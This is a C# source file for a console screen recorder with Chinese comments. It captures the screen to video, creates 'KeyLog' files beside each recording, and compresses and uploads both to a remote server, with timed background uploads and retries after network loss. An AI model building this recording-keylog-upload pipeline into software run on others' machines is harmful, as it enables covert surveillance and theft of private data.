using System;
using System.Threading.Tasks;
using System.Threading;
using System.IO;
using System.Collections.Generic;
using System.Runtime.CompilerServices;

namespace ScreenRecorder
{
    /// <summary>
    /// 控制台应用程序类，替代MainForm实现核心功能
    /// </summary>
    public class ConsoleApp
    {
        private CancellationTokenSource? cancellationTokenSource;
        private bool isRecording = false;
        private int frameRate = 10; // 默认帧率
        private int videoQuality = 20; // 视频质量参数，范围0-100
        private string? videoOutputPath;
        private string? keylogPath;


        // 功能类实例
        private ScreenRecorder? screenRecorder;
        private FileCompressor? fileCompressor;
        private FileUploader? fileUploader;
        private AutoUploadTimer? autoUploadTimer;
        private UploadQueueManager? uploadQueueManager;

        // 屏幕捕获定时器
        private System.Timers.Timer? screenCaptureTimer;

        public ConsoleApp()
        {
            cancellationTokenSource = new CancellationTokenSource();
            // 初始化上传队列管理器，用于断网续传功能
            uploadQueueManager = new UploadQueueManager();
            
            // 订阅网络恢复事件
            uploadQueueManager.NetworkRestored += async (sender, e) =>
            {
                await HandleNetworkRestoredAsync();
            };
        }

        public async Task RunAsync()
        {
            Console.WriteLine("屏幕录制工具 (控制台模式)");
            Console.WriteLine("按 'S' 键开始/停止录制");
            Console.WriteLine("按 'Q' 键退出程序");
            Console.WriteLine("----------------------------------------");

            try
            {
                // 程序启动时，尝试上传队列中的文件（断网续传功能）
                await TryUploadPendingFilesAsync();

                // 直接在主线程中处理按键输入
                while (!cancellationTokenSource.IsCancellationRequested)
                {
                    if (Console.KeyAvailable)
                    {
                        ConsoleKeyInfo keyInfo = Console.ReadKey(true);
                        
                        if (keyInfo.Key == ConsoleKey.S)
                        {
                            if (!isRecording)
                            {
                                await StartRecordingAsync();
                            }
                            else
                            {
                                await StopRecordingAsync();
                            }
                        }
                        else if (keyInfo.Key == ConsoleKey.Q)
                        {
                            Console.WriteLine("退出程序...");
                            cancellationTokenSource.Cancel();
                        }
                    }
                    await Task.Delay(10); // 避免CPU占用过高
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"程序运行出错: {ex.Message}");
            }
            finally
            {
                // 程序退出时确保停止所有录制和定时器
                try
                {
                    if (isRecording)
                    {
                        await StopRecordingAsync();
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"停止录制时出错: {ex.Message}");
                }
                
                // 释放所有资源
                try
                {
                    // 停止屏幕录制并释放资源
                    if (screenRecorder != null)
                    {
                        screenRecorder.StopRecording();
                        screenRecorder = null;
                    }
                    
                    // 释放捕获定时器
                    if (screenCaptureTimer != null)
                    {
                        screenCaptureTimer.Stop();
                        screenCaptureTimer.Dispose();
                        screenCaptureTimer = null;
                    }
                    
                    // 释放自动上传定时器
                    if (autoUploadTimer != null)
                    {
                        autoUploadTimer.Stop();
                        autoUploadTimer = null;
                    }
                    
                    // 释放取消令牌源
                    if (cancellationTokenSource != null)
                    {
                        cancellationTokenSource.Dispose();
                        cancellationTokenSource = null;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"释放资源时出错: {ex.Message}");
                }
                
                Console.WriteLine("程序已安全退出");
            }
        }

        // 网络恢复时的处理方法
        private async Task HandleNetworkRestoredAsync()
        {
            Console.WriteLine("检测到网络已恢复，自动尝试上传队列中的文件...");
            try
            {
                // 确保fileUploader已初始化
                if (fileUploader == null && uploadQueueManager != null)
                {
                    fileUploader = new FileUploader(uploadQueueManager);
                    Console.WriteLine("文件上传器已初始化");
                }
                
                await TryUploadPendingFilesAsync();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"网络恢复时处理上传任务出错: {ex.Message}");
            }
        }

        // 尝试上传队列中的待处理文件（断网续传功能）
        private async Task TryUploadPendingFilesAsync()
        {
            try
            {
                // 初始化文件上传器（如果还没有初始化）
                if (fileUploader == null && uploadQueueManager != null)
                {
                    fileUploader = new FileUploader(uploadQueueManager);
                }

                if (fileUploader != null && uploadQueueManager != null)
                {
                    Console.WriteLine("检查是否有待上传的文件...");
                    List<UploadQueueManager.UploadQueueItem> queue = uploadQueueManager.GetQueue();

                    if (queue.Count > 0)
                    {
                        Console.WriteLine($"发现 {queue.Count} 个待上传的文件，准备尝试上传...");
                        int successCount = await fileUploader.TryUploadQueueFilesAsync();
                        Console.WriteLine($"队列文件上传完成，成功上传 {successCount} 个文件");
                    }
                    else
                    {
                        Console.WriteLine("没有发现待上传的文件");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"尝试上传队列文件时出错: {ex.Message}");
            }
        }

        private async Task StartRecordingAsync()
        {
            try
            {
                // 添加一个小的延迟，使这个方法成为真正的异步方法
                await Task.Yield();
                
                // 创建输出目录（使用当前应用程序目录）
                string appDirectory = AppDomain.CurrentDomain.BaseDirectory;
                string captureFolder = Path.Combine(appDirectory, "ScreenCaptures");
                Directory.CreateDirectory(captureFolder);
                
                // 设置视频输出路径
                string timestamp = DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
                keylogPath = Path.Combine(captureFolder, $"KeyLog_{timestamp}.txt");
                videoOutputPath = Path.Combine(captureFolder, $"ScreenRecording_{timestamp}.avi");

                Console.WriteLine($"视频文件路径: {videoOutputPath}");
                Console.WriteLine($"键盘记录路径: {keylogPath}");

                // 初始化键盘记录
                using (StreamWriter keylogWriter = new StreamWriter(keylogPath))
                {
                    keylogWriter.WriteLine($"键盘记录开始于: {DateTime.Now}");
                }

                // 初始化屏幕录制器
                screenRecorder = new ScreenRecorder();
                screenRecorder.SetFrameRate(frameRate);
                screenRecorder.SetVideoQuality(videoQuality);
                screenRecorder.StartRecording(videoOutputPath);

                // 初始化文件压缩器和上传器
                try
                {
                    fileCompressor = new FileCompressor();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"警告：初始化文件压缩器失败: {ex.Message}");
                }
                fileUploader = new FileUploader(uploadQueueManager);

                // 启动屏幕捕获定时器
                screenCaptureTimer = new System.Timers.Timer();
                screenCaptureTimer.Interval = 1000 / frameRate; // 根据帧率设置间隔
                screenCaptureTimer.Elapsed += async (sender, e) => await CaptureFrameAsync();
                screenCaptureTimer.Start();

                // 初始化并启动自动上传定时器（如果压缩器可用）
                if (fileCompressor != null)
                {
                    InitializeAutoUploadTimer();
                }

                isRecording = true;
                Console.WriteLine("录制已开始，按 'S' 键停止，按 'Q' 键退出");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"启动录制时出错: {ex.Message}");
            }
        }

        // 录制状态标志，避免在自动上传过程中重复处理文件
        private bool isAutoUploadInProgress = false;

        // 仅停止录制组件但不处理文件上传（用于自动上传过程）
        private void StopRecordingComponents()
        {
            // 停止屏幕捕获
            if (screenCaptureTimer != null)
            {
                screenCaptureTimer.Stop();
                screenCaptureTimer.Dispose();
                screenCaptureTimer = null;
            }
            
            // 停止录制器
            screenRecorder?.StopRecording();
            
            // 设置录制状态为false
            isRecording = false;
        }
        
        private async Task StopRecordingAsync()
        {
            try
            {
                // 停止录制组件
                StopRecordingComponents();

                // 记录结束时间
                if (!string.IsNullOrEmpty(keylogPath))
                {
                    using (StreamWriter keylogWriter = new StreamWriter(keylogPath, true))
                    {
                        keylogWriter.WriteLine($"键盘记录结束于: {DateTime.Now}");
                    }
                }

                // 停止并释放自动上传定时器
                autoUploadTimer?.Stop();
                autoUploadTimer = null;
                
                Console.WriteLine("录制已停止，正在处理文件...");
                
                // 等待一小段时间确保所有资源都已释放
                await Task.Delay(200);

                // 录制完成后直接保存，执行压缩和上传功能（如果可用）
                // 只有在非自动上传过程中才执行压缩和上传，避免重复处理
                if (!isAutoUploadInProgress && fileCompressor != null && fileUploader != null && !string.IsNullOrEmpty(videoOutputPath) && !string.IsNullOrEmpty(keylogPath))
                {
                    try
                    {
                        // 等待一段时间确保文件句柄被释放
                        await Task.Delay(300);

                        // 执行异步压缩
                        Console.WriteLine("正在压缩文件...");
                        string zipFilePath = fileCompressor.CompressFiles(videoOutputPath, keylogPath);
                           
                        if (!string.IsNullOrEmpty(zipFilePath))
                        {
                            // 等待一段时间确保压缩文件句柄被释放
                            await Task.Delay(200);

                            // 执行上传到服务器
                            Console.WriteLine("正在上传文件...");
                            bool uploadSuccess = await fileUploader.UploadToRemoteServerAsync(zipFilePath, keylogPath);
                            
                            if (uploadSuccess)
                            {
                                Console.WriteLine("文件上传成功，已删除临时文件");
                            }
                            else
                            {
                                Console.WriteLine("文件上传失败");
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"压缩或上传过程中出错: {ex.Message}");
                    }
                }
                else if (isAutoUploadInProgress)
                {
                    Console.WriteLine("文件已通过自动上传处理，跳过重复处理");
                }
                Console.WriteLine("文件处理完成，按 'S' 键开始新的录制，按 'Q' 键退出");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"停止录制时出错: {ex.Message}");
            }
        }

        private async Task CaptureFrameAsync()
        {
            // 添加一个小的延迟，使这个方法成为真正的异步方法
            await Task.Yield();
            
            // 首先检查录制状态和资源是否有效
            if (!isRecording || screenRecorder == null || screenCaptureTimer == null)
            {
                return;
            }
            
            try
            {
                // 再次检查screenRecorder是否为null，防止在异步过程中被释放
                if (screenRecorder != null && isRecording)
                {
                    // 捕获屏幕
                    screenRecorder.CaptureFrame();

                    // 每100帧更新一次状态
                    if (screenRecorder.FrameCount % 100 == 0)
                    {
                        Console.WriteLine($"录制中... 已捕获 {screenRecorder.FrameCount} 帧");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"捕获屏幕时出错: {ex.Message}");
                // 出错时安全地停止捕获，避免连续报错
                try
                {
                    if (screenCaptureTimer != null)
                    {
                        screenCaptureTimer.Stop();
                        screenCaptureTimer.Dispose();
                        screenCaptureTimer = null;
                    }
                }
                catch { /* 忽略清理过程中的错误 */ }
            }
        }

        // 初始化自动上传定时器
        private void InitializeAutoUploadTimer()
        {
            if (fileCompressor != null && fileUploader != null)
            {
                autoUploadTimer = new AutoUploadTimer(fileCompressor, fileUploader);
                autoUploadTimer.AutoUploadRequired += async (sender, e) => await HandleAutoUploadAsync();
                autoUploadTimer.Initialize();
            }
        }

        // 处理自动上传事件
        private async Task HandleAutoUploadAsync()
        {
            if (isRecording && !string.IsNullOrEmpty(videoOutputPath) && !string.IsNullOrEmpty(keylogPath))
            {
                try
                {
                    // 设置自动上传进行中的标志
                    isAutoUploadInProgress = true;
                    Console.WriteLine("执行自动上传...");

                    // 记录自动上传点
                    using (StreamWriter keylogWriter = new StreamWriter(keylogPath, true))
                    {
                        keylogWriter.WriteLine($"自动上传点: {DateTime.Now}");
                    }

                    // 保存当前的输出路径引用，因为后续操作会更新这些变量
                    string currentVideoPath = videoOutputPath;
                    string currentKeylogPath = keylogPath;
                    
                    // 停止当前录制和捕获定时器，但保留文件路径信息
                    StopRecordingComponents();

                    // 立即创建新的录制文件继续录制，不等待上传完成
                    await CreateNewRecordingFilesAsync();

                    // 在后台执行自动上传，不阻塞录制重启
                    if (autoUploadTimer != null)
                    {
                        // 使用Task.Run在后台线程执行上传，不阻塞主线程
                        _ = Task.Run(async () =>
                        {
                            try
                            {
                                await autoUploadTimer.PerformAutoUploadAsync(currentVideoPath, currentKeylogPath);
                                Console.WriteLine("自动上传完成");
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine($"自动上传过程中出错: {ex.Message}");
                            }
                        });
                    }

                    // 记录自动上传完成
                    using (StreamWriter keylogWriter = new StreamWriter(keylogPath, true))
                    {
                        keylogWriter.WriteLine($"自动上传已启动: {DateTime.Now}");
                    }
                    
                    Console.WriteLine("自动上传已启动，继续录制");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"自动上传过程中出错: {ex.Message}");
                }
                finally
                {
                    // 无论成功失败，都要重置自动上传标志
                    isAutoUploadInProgress = false;
                }
            }
        }

        // 创建临时文件用于继续录制
        public async Task CreateNewRecordingFilesAsync()
        {
            try
            {
                // 保存当前目录信息，避免后续操作影响
                string captureFolder = null;
                if (!string.IsNullOrEmpty(videoOutputPath))
                {
                    captureFolder = Path.GetDirectoryName(videoOutputPath);
                }
                
                if (captureFolder != null && Directory.Exists(captureFolder))
                {
                    // 创建新的时间戳和文件路径
                    string newTimestamp = DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
                    string newKeylogPath = Path.Combine(captureFolder, $"KeyLog_{newTimestamp}_Part.txt");
                    string newVideoPath = Path.Combine(captureFolder, $"ScreenRecording_{newTimestamp}_Part.avi");
                    
                    // 首先创建新的键盘记录文件
                    using (StreamWriter keylogWriter = new StreamWriter(newKeylogPath))
                    {
                        keylogWriter.WriteLine($"继续录制: {DateTime.Now}");
                    }
                    
                    // 异步创建并启动新的录制器，避免阻塞主线程
                    await Task.Run(() =>
                    {
                        try
                        {
                            // 立即创建新的屏幕录制器并配置
                            ScreenRecorder newRecorder = new ScreenRecorder();
                            newRecorder.SetFrameRate(frameRate);
                            newRecorder.SetVideoQuality(videoQuality);
                            
                            // 立即启动新录制器
                            newRecorder.StartRecording(newVideoPath);
                            
                            // 保存新的路径
                            keylogPath = newKeylogPath;
                            videoOutputPath = newVideoPath;
                            
                            // 释放旧的录制器资源
                            if (screenRecorder != null)
                            {
                                screenRecorder.StopRecording();
                                screenRecorder = null;
                            }
                            
                            // 替换为新的录制器
                            screenRecorder = newRecorder;
                            
                            Console.WriteLine($"创建新的录制文件: {videoOutputPath}");
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"创建新录制器时出错: {ex.Message}");
                        }
                    });
                    
                    // 立即创建并启动新的捕获定时器，不等待录制器完全初始化
                    try
                    {
                        // 确保旧的捕获定时器已停止并释放
                        if (screenCaptureTimer != null)
                        {
                            screenCaptureTimer.Stop();
                            screenCaptureTimer.Dispose();
                        }
                        
                        // 重新启动屏幕捕获定时器
                        screenCaptureTimer = new System.Timers.Timer();
                        screenCaptureTimer.Interval = 1000 / frameRate; // 根据帧率设置间隔
                        screenCaptureTimer.Elapsed += async (sender, e) => await CaptureFrameAsync();
                        screenCaptureTimer.Start();
                        Console.WriteLine("屏幕捕获定时器已重新启动，间隔: " + screenCaptureTimer.Interval + "ms");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"重启捕获定时器时出错: {ex.Message}");
                    }
                    
                    // 立即设置录制状态为true，不等待所有操作完成
                    isRecording = true;
                    Console.WriteLine("录制状态已设置为: " + isRecording);
                    
                    // 异步处理自动上传定时器的初始化，不阻塞录制重启
                    await Task.Run(() =>
                    {
                        try
                        {
                            if (autoUploadTimer == null && fileCompressor != null && fileUploader != null)
                            {
                                autoUploadTimer = new AutoUploadTimer(fileCompressor, fileUploader);
                                autoUploadTimer.AutoUploadRequired += async (sender, e) => await HandleAutoUploadAsync();
                                autoUploadTimer.Initialize();
                                Console.WriteLine("自动上传定时器已重新创建并初始化，间隔: " + autoUploadTimer.AutoUploadIntervalMinutes + "分钟");
                            }
                            else
                            {
                                // 只更新最后上传时间，不重新初始化定时器，避免重复触发
                                Console.WriteLine("自动上传定时器已存在，使用现有定时器继续监控");
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"处理自动上传定时器时出错: {ex.Message}");
                        }
                    });
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"创建新录制文件时出错: {ex.Message}");
            }
        }
    }
}